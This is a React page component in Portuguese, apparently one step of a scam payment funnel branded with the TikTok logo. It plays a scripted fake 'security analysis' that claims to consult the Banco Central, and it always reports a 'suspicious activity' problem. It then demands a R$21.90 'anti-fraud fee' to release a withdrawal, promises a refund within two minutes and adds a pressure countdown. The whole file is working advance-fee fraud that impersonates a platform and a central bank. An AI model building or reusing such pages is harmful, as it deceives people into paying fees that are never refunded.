import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Search, AlertTriangle, Lock, Shield, Check, CreditCard, Clock, Fingerprint, Database, Globe, ServerCog } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";

const FONT = "Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif";
const RED = "#FE2B54";
const GREEN = "#10B981";
const UPSELL2_TAX = 21.90;

type Screen = "verification" | "problem" | "main";

const verificationSteps = [
  { text: "Verificando dados da conta", icon: Search },
  { text: "Validando informações pessoais", icon: Fingerprint },
  { text: "Conectando com sistema bancário", icon: Database },
  { text: "Consultando Banco Central", icon: Globe },
];

const Upsell2 = () => {
  const [screen, setScreen] = useState<Screen>("verification");
  const [visibleSteps, setVisibleSteps] = useState(0);
  const [progress, setProgress] = useState(0);
  const [countdown, setCountdown] = useState(4 * 60);
  const [visible, setVisible] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    trackTikTokEvent({ event: "ViewContent", properties: { page: "upsell2", content_type: "security_validation" } });

    // Smooth progress increments
    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 95) return prev;
        return prev + 1.4;
      });
    }, 100);

    const timers = verificationSteps.map((_, i) =>
      setTimeout(() => setVisibleSteps(i + 1), 1500 * (i + 1))
    );

    const problemTimer = setTimeout(() => {
      clearInterval(progressInterval);
      setProgress(100);
      setScreen("problem");
    }, 7500);

    const mainTimer = setTimeout(() => {
      setScreen("main");
      requestAnimationFrame(() => setVisible(true));
    }, 9500);

    return () => {
      timers.forEach(clearTimeout);
      clearTimeout(problemTimer);
      clearTimeout(mainTimer);
      clearInterval(progressInterval);
    };
  }, []);

  useEffect(() => {
    if (screen !== "main") return;
    const interval = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [screen]);

  const mins = String(Math.floor(countdown / 60)).padStart(2, "0");
  const secs = String(countdown % 60).padStart(2, "0");

  const handlePagar = () => {
    trackTikTokEvent({ event: "InitiateCheckout", properties: { page: "upsell2", value: UPSELL2_TAX } });
    navigate("/pagamento");
  };

  const fadeUp = (delay: number): React.CSSProperties => ({
    opacity: visible ? 1 : 0,
    transform: visible ? "translateY(0)" : "translateY(20px)",
    transition: `opacity 0.6s cubic-bezier(0.16,1,0.3,1) ${delay}s, transform 0.6s cubic-bezier(0.16,1,0.3,1) ${delay}s`,
  });

  return (
    <div style={{ fontFamily: FONT, background: "#F5F5F5", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <div style={{
        width: "100%", background: "#fff", padding: "14px 0",
        borderBottom: "1px solid #eee",
        display: "flex", justifyContent: "center",
        position: "sticky", top: 0, zIndex: 100,
        boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
      }}>
        <img src={tiktokLogo} alt="TikTok" style={{ height: 22 }} loading="eager" decoding="async" />
      </div>

      <div style={{ maxWidth: 449, margin: "0 auto", width: "100%", flex: 1, padding: "0 12px" }}>

        {/* ─── Tela 1: Verificação Profissional ─── */}
        {screen === "verification" && (
          <div style={{ padding: "40px 0", minHeight: "75vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
            {/* Card container */}
            <div style={{
              background: "#fff", borderRadius: 20, padding: "36px 24px 28px",
              boxShadow: "0 4px 32px rgba(0,0,0,0.08), 0 1px 4px rgba(0,0,0,0.04)",
              width: "100%", maxWidth: 380, textAlign: "center",
              animation: "slideUp 0.6s cubic-bezier(0.16,1,0.3,1)",
            }}>
              {/* Animated scanner icon */}
              <div style={{
                width: 72, height: 72,
                background: `linear-gradient(135deg, ${GREEN}, #34D399)`,
                borderRadius: 18,
                display: "flex", alignItems: "center", justifyContent: "center",
                margin: "0 auto 20px",
                boxShadow: `0 6px 24px rgba(16,185,129,0.25)`,
                animation: "iconFloat 3s ease-in-out infinite",
                position: "relative" as const,
              }}>
                <ServerCog size={30} color="#fff" style={{ animation: "spinSlow 4s linear infinite" }} />
                {/* Orbiting ring */}
                <div style={{
                  position: "absolute", inset: -6,
                  border: `2px solid rgba(16,185,129,0.15)`,
                  borderRadius: 22,
                  animation: "ringPulse 2s ease-in-out infinite",
                }} />
              </div>

              <p style={{ fontSize: 16, color: "#000", fontWeight: 700, marginBottom: 4 }}>
                Análise de Segurança
              </p>
              <p style={{ fontSize: 12, color: "#848286", marginBottom: 24 }}>
                Verificando integridade da transação
              </p>

              {/* Progress bar */}
              <div style={{ width: "100%", height: 4, background: "#F1F1F3", borderRadius: 2, overflow: "hidden", marginBottom: 28 }}>
                <div style={{
                  width: `${Math.min(progress, 100)}%`, height: "100%",
                  background: `linear-gradient(90deg, ${GREEN}, #34D399)`,
                  borderRadius: 2,
                  transition: "width 0.3s ease",
                  boxShadow: `0 0 8px rgba(16,185,129,0.4)`,
                }} />
              </div>

              {/* Steps */}
              <div style={{ display: "flex", flexDirection: "column", gap: 12, textAlign: "left" }}>
                {verificationSteps.map((step, i) => {
                  const StepIcon = step.icon;
                  const isActive = i < visibleSteps;
                  const isCurrent = i === visibleSteps - 1 && visibleSteps < verificationSteps.length;
                  return (
                    <div
                      key={i}
                      style={{
                        display: "flex", alignItems: "center", gap: 12,
                        padding: "10px 14px", borderRadius: 10,
                        background: isActive ? "rgba(16,185,129,0.04)" : "#FAFAFA",
                        border: `1px solid ${isActive ? "rgba(16,185,129,0.12)" : "#F1F1F3"}`,
                        opacity: isActive ? 1 : 0.4,
                        transform: isActive ? "translateX(0)" : "translateX(-8px)",
                        transition: "all 0.5s cubic-bezier(0.16,1,0.3,1)",
                      }}
                    >
                      <div style={{
                        width: 32, height: 32, borderRadius: 8,
                        background: isActive ? GREEN : "#F1F1F3",
                        display: "flex", alignItems: "center", justifyContent: "center",
                        flexShrink: 0,
                        boxShadow: isActive ? `0 2px 8px rgba(16,185,129,0.2)` : "none",
                        transition: "all 0.5s ease",
                      }}>
                        {isActive ? (
                          isCurrent ? (
                            <StepIcon size={14} color="#fff" style={{ animation: "spinSlow 2s linear infinite" }} />
                          ) : (
                            <Check size={14} color="#fff" strokeWidth={3} />
                          )
                        ) : (
                          <StepIcon size={14} color="#ccc" />
                        )}
                      </div>
                      <div style={{ flex: 1 }}>
                        <span style={{ fontSize: 13, fontWeight: 600, color: isActive ? "#000" : "#bbb", transition: "color 0.3s" }}>
                          {step.text}
                        </span>
                      </div>
                      {isActive && !isCurrent && (
                        <span style={{ fontSize: 10, fontWeight: 600, color: GREEN, background: "rgba(16,185,129,0.08)", padding: "2px 8px", borderRadius: 99 }}>
                          OK
                        </span>
                      )}
                      {isCurrent && (
                        <div style={{ display: "flex", gap: 3 }}>
                          {[0, 1, 2].map(d => (
                            <div key={d} style={{
                              width: 4, height: 4, borderRadius: "50%", background: GREEN,
                              animation: `dotBounce 1.2s infinite ease-in-out`,
                              animationDelay: `${d * 0.15}s`,
                            }} />
                          ))}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>

              <p style={{ fontSize: 10, color: "#bbb", marginTop: 20, fontWeight: 500 }}>
                Conexão criptografada • SSL 256-bit
              </p>
            </div>
          </div>
        )}

        {/* ─── Tela 2: Problema Detectado ─── */}
        {screen === "problem" && (
          <div style={{ padding: "40px 0", minHeight: "75vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
            <div style={{
              background: "#fff", borderRadius: 20, padding: "40px 24px 32px",
              boxShadow: "0 4px 32px rgba(0,0,0,0.08), 0 1px 4px rgba(0,0,0,0.04)",
              width: "100%", maxWidth: 380, textAlign: "center",
              animation: "shakeIn 0.5s cubic-bezier(0.16,1,0.3,1)",
            }}>
              <div style={{
                width: 72, height: 72,
                background: RED,
                borderRadius: "50%",
                display: "flex", alignItems: "center", justifyContent: "center",
                margin: "0 auto 20px",
                boxShadow: `0 6px 28px rgba(254,43,84,0.3), 0 0 0 8px rgba(254,43,84,0.06)`,
                animation: "alertPulse 1.5s ease-in-out infinite",
              }}>
                <AlertTriangle size={30} color="#fff" />
              </div>

              <p style={{ fontSize: 18, color: RED, fontWeight: 800, marginBottom: 8, letterSpacing: "-0.2px" }}>
                Problema Detectado
              </p>
              <p style={{ fontSize: 13, color: "#666", lineHeight: 1.6, maxWidth: 280, margin: "0 auto" }}>
                Foi identificada uma atividade suspeita na sua transação. Validação adicional necessária.
              </p>

              {/* Loading indicator */}
              <div style={{ display: "flex", justifyContent: "center", gap: 4, marginTop: 24 }}>
                {[0, 1, 2].map(i => (
                  <div key={i} style={{
                    width: 8, height: 8, borderRadius: "50%", background: RED,
                    animation: `dotBounce 1.2s infinite ease-in-out`,
                    animationDelay: `${i * 0.15}s`,
                  }} />
                ))}
              </div>
            </div>
          </div>
        )}

        {/* ─── Tela 3: Validação de Segurança ─── */}
        {screen === "main" && (
          <div style={{ padding: "16px 0 110px" }}>
            {/* Status Card */}
            <div style={{
              ...fadeUp(0.05),
              background: "#fff", borderRadius: 16, padding: "28px 20px 24px",
              boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
              textAlign: "center",
            }}>
              <div style={{
                ...fadeUp(0.1),
                width: 56, height: 56, background: RED,
                borderRadius: "50%",
                display: "flex", alignItems: "center", justifyContent: "center",
                margin: "0 auto 16px",
                boxShadow: `0 4px 20px rgba(254,43,84,0.25), 0 0 0 6px rgba(254,43,84,0.08)`,
                animation: "softPulse 2.5s ease-in-out infinite",
              }}>
                <Lock size={24} color="#fff" />
              </div>
              <h1 style={{ ...fadeUp(0.15), color: "#000", fontSize: 20, fontWeight: 700, marginBottom: 8 }}>
                Validação de Segurança
              </h1>
              <p style={{ ...fadeUp(0.2), fontSize: 13, color: "#666", lineHeight: 1.6, maxWidth: 300, margin: "0 auto" }}>
                Seu saque precisa de uma verificação adicional para ser liberado
              </p>
            </div>

            {/* Alert Card */}
            <div style={{
              ...fadeUp(0.25),
              background: "#fff", borderRadius: 16, padding: "20px",
              marginTop: 12,
              boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
              borderLeft: `4px solid ${RED}`,
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, color: RED, fontSize: 14, fontWeight: 700, marginBottom: 10 }}>
                <AlertTriangle size={16} />
                Medida de Segurança
              </div>
              <p style={{ fontSize: 13, color: "#666", lineHeight: 1.6 }}>
                O <strong style={{ color: "#000", fontWeight: 600 }}>Banco Central</strong> exige
                uma validação de segurança. A taxa de{" "}
                <strong style={{ color: "#000", fontWeight: 600 }}>
                  R$ {UPSELL2_TAX.toFixed(2).replace(".", ",")}
                </strong>{" "}
                será reembolsada em 2 minutos após o pagamento.
              </p>
            </div>

            {/* Fee Card */}
            <div style={{
              ...fadeUp(0.3),
              background: "#fff", borderRadius: 16, padding: "24px 20px",
              marginTop: 12,
              boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
              textAlign: "center",
            }}>
              <div style={{
                display: "inline-flex", alignItems: "center", gap: 6,
                background: RED, color: "#fff",
                padding: "6px 14px", borderRadius: 99,
                fontSize: 11, fontWeight: 700, marginBottom: 16,
                boxShadow: `0 3px 10px rgba(254,43,84,0.2)`,
              }}>
                <Shield size={13} />
                TAXA ANTI-FRAUDE
              </div>

              <p style={{ fontSize: 28, fontWeight: 800, color: RED, marginBottom: 6 }}>
                R$ {UPSELL2_TAX.toFixed(2).replace(".", ",")}
              </p>
              <p style={{ fontSize: 12, color: "#848286", marginBottom: 20 }}>
                Valor reembolsável em 2 minutos
              </p>

              {/* Benefits */}
              <div style={{ display: "flex", flexDirection: "column", gap: 10, margin: "16px 0 20px" }}>
                {["Liberação imediata do saque", "Reembolso automático"].map((text, i) => (
                  <div key={text} style={{
                    ...fadeUp(0.35 + i * 0.05),
                    display: "flex", alignItems: "center", gap: 10,
                    background: "#F8F9FB", padding: "10px 14px", borderRadius: 10,
                    boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8), 0 1px 3px rgba(0,0,0,0.03)",
                  }}>
                    <div style={{
                      width: 22, height: 22, background: GREEN, borderRadius: "50%",
                      display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
                      boxShadow: `0 2px 6px rgba(16,185,129,0.25)`,
                    }}>
                      <Check size={11} color="#fff" strokeWidth={3} />
                    </div>
                    <span style={{ fontSize: 13, color: "#333", fontWeight: 500, textAlign: "left" }}>{text}</span>
                  </div>
                ))}
              </div>

              {/* CTA */}
              <button
                onClick={handlePagar}
                style={{
                  width: "100%", border: 0, borderRadius: 99,
                  padding: "17px 20px", fontSize: 15, fontWeight: 700,
                  cursor: "pointer", color: "#fff", background: GREEN,
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  boxShadow: `0 6px 24px rgba(16,185,129,0.3), 0 2px 6px rgba(16,185,129,0.15), inset 0 1px 0 rgba(255,255,255,0.15)`,
                  fontFamily: FONT, letterSpacing: "0.2px",
                  transition: "transform 0.15s ease",
                  animation: "ctaGlowGreen 2s ease-in-out infinite",
                }}
                onMouseDown={e => (e.currentTarget.style.transform = "scale(0.97)")}
                onMouseUp={e => (e.currentTarget.style.transform = "scale(1)")}
                onMouseLeave={e => (e.currentTarget.style.transform = "scale(1)")}
              >
                <CreditCard size={17} />
                PAGAR E LIBERAR SAQUE
              </button>
            </div>

            {/* Timer + Security */}
            <div style={{
              ...fadeUp(0.5),
              background: "#fff", borderRadius: 12, padding: "14px 16px",
              marginTop: 12, boxShadow: "0 1px 12px rgba(0,0,0,0.04)",
              display: "flex", flexDirection: "column", alignItems: "center", gap: 10,
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 500, color: "#848286" }}>
                <Clock size={13} />
                Validação disponível por:{" "}
                <span style={{ color: RED, fontWeight: 700, fontSize: 13, background: "rgba(254,43,84,0.06)", padding: "2px 8px", borderRadius: 6 }}>
                  {mins}:{secs}
                </span>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 11, color: "#aaa", fontWeight: 500 }}>
                <Shield size={11} color={GREEN} />
                Pagamento 100% seguro e protegido
              </div>
            </div>

            <p style={{ ...fadeUp(0.55), textAlign: "center", fontSize: 11, color: "#aaa", marginTop: 14, lineHeight: 1.5, padding: "0 8px" }}>
              Esta validação é necessária para conclusão segura da transferência conforme exigido pelo Banco Central.
            </p>
          </div>
        )}
      </div>

      <style>{`
        @keyframes slideUp {
          from { opacity: 0; transform: translateY(30px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes softPulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.06); }
        }
        @keyframes alertPulse {
          0%, 100% { transform: scale(1); box-shadow: 0 6px 28px rgba(254,43,84,0.3), 0 0 0 8px rgba(254,43,84,0.06); }
          50% { transform: scale(1.04); box-shadow: 0 8px 36px rgba(254,43,84,0.35), 0 0 0 12px rgba(254,43,84,0.04); }
        }
        @keyframes iconFloat {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-6px); }
        }
        @keyframes spinSlow {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @keyframes ringPulse {
          0%, 100% { opacity: 0.4; transform: scale(1); }
          50% { opacity: 0.8; transform: scale(1.08); }
        }
        @keyframes dotBounce {
          0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
          40% { transform: scale(1); opacity: 1; }
        }
        @keyframes shakeIn {
          0% { opacity: 0; transform: translateX(-8px); }
          30% { transform: translateX(6px); }
          60% { transform: translateX(-4px); }
          100% { opacity: 1; transform: translateX(0); }
        }
        @keyframes ctaGlowGreen {
          0%, 100% { box-shadow: 0 6px 24px rgba(16,185,129,0.3), 0 2px 6px rgba(16,185,129,0.15), inset 0 1px 0 rgba(255,255,255,0.15); }
          50% { box-shadow: 0 8px 32px rgba(16,185,129,0.4), 0 4px 12px rgba(16,185,129,0.2), inset 0 1px 0 rgba(255,255,255,0.15); }
        }
      `}</style>
    </div>
  );
};

export default Upsell2;
